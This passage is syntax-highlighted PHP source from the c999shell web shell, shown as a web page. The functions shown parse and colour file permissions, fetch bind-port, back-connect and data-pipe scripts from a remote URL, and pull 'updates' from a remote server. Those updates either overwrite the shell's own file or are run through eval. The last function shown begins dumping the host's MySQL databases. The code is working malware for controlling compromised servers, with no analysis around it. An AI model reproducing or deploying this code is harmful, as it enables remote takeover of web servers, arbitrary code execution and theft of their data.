 <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x400</span><span class="p">)</span> <span class="p">{</span><span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;x&quot;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;s&quot;</span><span class="o">:</span><span class="s2">&quot;S&quot;</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x200</span><span class="p">)</span> <span class="p">{</span><span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;x&quot;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;t&quot;</span><span class="o">:</span><span class="s2">&quot;T&quot;</span><span class="p">;}</span>
 <span class="k">return</span> <span class="nv">$type</span><span class="o">.</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$owner</span><span class="p">)</span><span class="o">.</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$group</span><span class="p">)</span><span class="o">.</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$world</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;posix_getpwuid&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="s2">&quot;posix_getpwuid&quot;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">posix_getpwuid</span><span class="p">(</span><span class="nv">$uid</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;posix_getgrgid&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="s2">&quot;posix_getgrgid&quot;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">posix_getgrgid</span><span class="p">(</span><span class="nv">$gid</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;posix_kill&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="s2">&quot;posix_kill&quot;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">posix_kill</span><span class="p">(</span><span class="nv">$gid</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;parse_perms&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">parse_perms</span><span class="p">(</span><span class="nv">$mode</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">if</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;s&quot;</span><span class="p">;}</span>
 <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;d&quot;</span><span class="p">;}</span>
 <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;l&quot;</span><span class="p">;}</span>
 <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;-&quot;</span><span class="p">;}</span>
 <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;b&quot;</span><span class="p">;}</span>
 <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;c&quot;</span><span class="p">;}</span>
 <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;p&quot;</span><span class="p">;}</span>
 <span class="k">else</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">=</span> <span class="s2">&quot;?&quot;</span><span class="p">;}</span>
 <span class="nv">$o</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00400</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$o</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00200</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$o</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00100</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span>
 <span class="nv">$g</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00040</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$g</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00020</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$g</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00010</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span>
 <span class="nv">$w</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00004</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$w</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00002</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$w</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00001</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">;</span>
 <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;t&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$t</span><span class="p">,</span><span class="s2">&quot;o&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$o</span><span class="p">,</span><span class="s2">&quot;g&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$g</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$w</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;parsesort&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">parsesort</span><span class="p">(</span><span class="nv">$sort</span><span class="p">)</span>
<span class="p">{</span>
 <span class="nv">$one</span> <span class="o">=</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$sort</span><span class="p">);</span>
 <span class="nv">$second</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$sort</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$second</span> <span class="o">!=</span> <span class="s2">&quot;d&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$second</span> <span class="o">=</span> <span class="s2">&quot;a&quot;</span><span class="p">;}</span>
 <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="nv">$one</span><span class="p">,</span><span class="nv">$second</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;view_perms_color&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">view_perms_color</span><span class="p">(</span><span class="nv">$o</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;</span>
<span class="s2">&amp;lt;span style=&quot;</span><span class="nx">color</span><span class="o">:</span> <span class="nx">red</span><span class="p">;</span><span class="s2">&quot;&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_perms</span><span class="p">(</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/span&amp;gt;</span>
<span class="s2">&amp;lt;pre&amp;gt;&quot;</span><span class="p">;}</span>
 <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;</span>
<span class="s2">&amp;lt;span style=&quot;</span><span class="nx">color</span><span class="o">:</span> <span class="nx">white</span><span class="p">;</span><span class="s2">&quot;&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_perms</span><span class="p">(</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/span&amp;gt;</span>
<span class="s2">&amp;lt;pre&amp;gt;&quot;</span><span class="p">;}</span>
 <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;</span>
<span class="s2">&amp;lt;span style=&quot;</span><span class="nx">color</span><span class="o">:</span> <span class="nx">green</span><span class="p">;</span><span class="s2">&quot;&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_perms</span><span class="p">(</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/span&amp;gt;</span>
<span class="s2">&amp;lt;pre&amp;gt;&quot;</span><span class="p">;}</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;c999getsource&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">c999getsource</span><span class="p">(</span><span class="nv">$fn</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">global</span> <span class="nv">$c999sh_sourcesurl</span><span class="p">;</span>
 <span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
  <span class="s2">&quot;c999sh_bindport.pl&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;c999sh_bindport_pl.txt&quot;</span><span class="p">,</span>
  <span class="s2">&quot;c999sh_bindport.c&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;c999sh_bindport_c.txt&quot;</span><span class="p">,</span>
  <span class="s2">&quot;c999sh_backconn.pl&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;c999sh_backconn_pl.txt&quot;</span><span class="p">,</span>
  <span class="s2">&quot;c999sh_backconn.c&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;c999sh_backconn_c.txt&quot;</span><span class="p">,</span>
  <span class="s2">&quot;c999sh_datapipe.pl&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;c999sh_datapipe_pl.txt&quot;</span><span class="p">,</span>
  <span class="s2">&quot;c999sh_datapipe.c&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;c999sh_datapipe_c.txt&quot;</span><span class="p">,</span>
 <span class="p">);</span>
 <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$array</span><span class="p">[</span><span class="nv">$fn</span><span class="p">];</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$c999sh_sourcesurl</span><span class="o">.</span><span class="nv">$name</span><span class="p">);}</span>
 <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;c999sh_getupdate&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">c999sh_getupdate</span><span class="p">(</span><span class="nv">$update</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">)</span>
<span class="p">{</span>
 <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;c999sh_updateurl&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;?version=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&quot;shver&quot;</span><span class="p">]))</span><span class="o">.</span><span class="s2">&quot;&amp;updatenow=&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$updatenow</span><span class="o">?</span><span class="s2">&quot;1&quot;</span><span class="o">:</span><span class="s2">&quot;0&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;&quot;</span><span class="p">;</span>
 <span class="nv">$data</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;Can&#39;t connect to update-server!&quot;</span><span class="p">;}</span>
 <span class="k">else</span>
 <span class="p">{</span>
  <span class="nv">$data</span> <span class="o">=</span> <span class="nb">ltrim</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
  <span class="nv">$string</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">2</span><span class="p">}));</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x99</span><span class="s2">&quot;</span> <span class="k">and</span> <span class="nv">$data</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x01</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;Error: &quot;</span><span class="o">.</span><span class="nv">$string</span><span class="p">;</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x99</span><span class="s2">&quot;</span> <span class="k">and</span> <span class="nv">$data</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x02</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;You are using latest version!&quot;</span><span class="p">;}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x99</span><span class="s2">&quot;</span> <span class="k">and</span> <span class="nv">$data</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x03</span><span class="s2">&quot;</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="nv">$string</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x01</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$string</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$update</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="nv">$confvars</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="nv">$sourceurl</span> <span class="o">=</span> <span class="nv">$string</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="nv">$source</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$sourceurl</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$source</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;Can&#39;t fetch update!&quot;</span><span class="p">;}</span>
    <span class="k">else</span>
    <span class="p">{</span>
     <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;Local error: can&#39;t write update to &quot;</span><span class="o">.</span><span class="k">__FILE__</span><span class="o">.</span><span class="s2">&quot;! You may download c999shell.php manually &amp;lt;a href=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nv">$sourceurl</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot;&amp;gt;&amp;lt;span style=&quot;</span><span class="nx">text</span><span class="o">-</span><span class="nx">decoration</span><span class="o">:</span> <span class="nx">underline</span><span class="p">;</span><span class="s2">&quot;&amp;gt;here&amp;lt;/span&amp;gt;&amp;lt;/a&amp;gt;.&quot;</span><span class="p">;}</span>
     <span class="k">else</span> <span class="p">{</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$source</span><span class="p">);</span> <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span> <span class="k">return</span> <span class="s2">&quot;Thanks! Updated with success.&quot;</span><span class="p">;}</span>
    <span class="p">}</span>
   <span class="p">}</span>
   <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;New version are available: &quot;</span><span class="o">.</span><span class="nv">$string</span><span class="p">[</span><span class="mi">1</span><span class="p">];}</span>
  <span class="p">}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x99</span><span class="s2">&quot;</span> <span class="k">and</span> <span class="nv">$data</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x04</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">eval</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;}</span>
  <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&quot;Error in protocol: segmentation failed! (&quot;</span><span class="o">.</span><span class="nv">$data</span><span class="o">.</span><span class="s2">&quot;) &quot;</span><span class="p">;}</span>
 <span class="p">}</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mysql_dump&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">mysql_dump</span><span class="p">(</span><span class="nv">$set</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">global</span> <span class="nv">$shver</span><span class="p">;</span>
 <span class="nv">$sock</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;sock&quot;</span><span class="p">];</span>
 <span class="nv">$db</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;db&quot;</span><span class="p">];</span>
 <span class="nv">$print</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;print&quot;</span><span class="p">];</span>
 <span class="nv">$nl2br</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;nl2br&quot;</span><span class="p">];</span>
 <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;file&quot;</span><span class="p">];</span>
 <span class="nv">$add_drop</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;add_drop&quot;</span><span class="p">];</span>
 <span class="nv">$tabs</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;tabs&quot;</span><span class="p">];</span>
 <span class="nv">$onlytabs</span> <span class="o">=</span> <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;onlytabs&quot;</span><span class="p">];</span>
 <span class="nv">$ret</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
 <span class="nv">$ret</span><span class="p">[</span><span class="s2">&quot;err&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Error: </span><span class="se">\$</span><span class="s2">sock is not valid resource.&quot;</span><span class="p">);}</span>
 <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$db</span><span class="p">))</span> <span class="p">{</span><span class="nv">$db</span> <span class="o">=</span> <span class="s2">&quot;db&quot;</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$print</span><span class="p">))</span> <span class="p">{</span><span class="nv">$print</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$nl2br</span><span class="p">))</span> <span class="p">{</span><span class="nv">$nl2br</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$add_drop</span><span class="p">))</span> <span class="p">{</span><span class="nv">$add_drop</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span>
 <span class="p">{</span>
  <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$tmpdir</span><span class="o">.</span><span class="s2">&quot;dump_&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nv">$db</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d-m-Y-H-i-s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.sql&quot;</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$tabs</span><span class="p">))</span> <span class="p">{</span><span class="nv">$tabs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
 <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$add_drop</span><span class="p">))</span> <span class="p">{</span><span class="nv">$add_drop</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">sizeof</span><span class="p">(</span><span class="nv">$tabs</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
 <span class="p">{</span>
  <span class="c1">// retrive tables-list</span>
  <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW TABLES FROM &quot;</span><span class="o">.</span><span class="nv">$db</span><span class="p">,</span> <span class="nv">$sock</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$res</span><span class="p">))</span> <span class="p">{</span><span class="nv">$tabs</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">];}}</span>
 <span class="p">}</span>
 <span class="nv">$out</span> <span class="o">=</span> <span class="s2">&quot;# Dumped by c999Shell.SQL v. &quot;</span><span class="o">.</span><span class="nv">$shver</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="s2"># Home page: http://ccteam.ru</span>
<span class="s2">#</span>
<span class="s2"># Host settings:</span>
<span class="s2"># MySQL version: (&quot;</span><span class="o">.</span><span class="nb">mysql_get_server_info</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;) running on &quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_ADDR&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; (&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;)&quot;</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="s2"># Date: &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y H:i:s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span>
